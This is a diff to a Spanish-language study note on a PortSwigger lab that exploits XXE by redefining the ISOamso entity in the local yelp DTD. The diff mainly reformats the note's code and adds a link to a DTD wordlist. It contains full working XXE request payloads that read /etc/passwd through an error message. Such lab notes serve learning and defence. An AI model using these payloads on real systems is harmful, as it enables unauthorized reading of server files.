@@ -21,37 +21,36 @@ tags:
 ## Cómo explotarlo
 
 ### 1. Encontrar un DTD local (paso previo)
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
 Confirmás que existe un DTD conocido cargándolo solo. El estándar es el de GNOME **`yelp`**:
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM "<mark>file:///usr/share/yelp/dtd/docbookx.dtd</mark>"&gt;
 %local_dtd;
-]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
-```
+]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 Si **no** da error de "archivo no encontrado" → existe → seguí.
 
 ### 2. El ataque — redefinir una entidad del DTD local
 En `docbookx.dtd` existe la entidad de parámetro `ISOamso`. La **redefinís**:
-```http
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-<!ENTITY % ISOamso '
-<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-&#x25;eval;
-&#x25;error;
-'>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM "<mark>file:///usr/share/yelp/dtd/docbookx.dtd</mark>"&gt;
+&lt;!ENTITY % <mark>ISOamso</mark> '
+&lt;!ENTITY &amp;#x25; file SYSTEM "<mark>file:///etc/passwd</mark>"&gt;
+&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'&gt;
 %local_dtd;
-]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
-```
+]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 ## Cómo fluye (diagrama)
 ```mermaid
@@ -84,4 +83,4 @@ La respuesta trae el `FileNotFoundException` con `/etc/passwd` embebido (como [[
 - **`ISOamso` debe existir DENTRO de `docbookx.dtd`.** Al cargar el DTD local, tu redefinición gana y dispara el ataque. Con otro DTD local → redefinís una entidad **suya**.
 - **Escapado doble:** dentro de un valor de entidad que declara entidades, `%` = `&#x25;` y `&` = `&#x26;`. Por eso aparece `&#x26;#x25;` (un `%` doblemente escapado) y `&#x27;` (comilla simple).
 - **No usa exploit server ni Collaborator** — esa es la gracia: funciona con el server **aislado de internet**. Es el más rebuscado porque **nada de 001–007 aplicaba**.
-- `docbookx.dtd` es el candidato estándar (viene con `yelp`); hay otras rutas de DTD locales.
+- `docbookx.dtd` es el candidato estándar (viene con `yelp`); hay otras rutas de DTD locales → [[vulnerabilities/006-xxe/resources/dtd_files|wordlist de DTDs locales]].
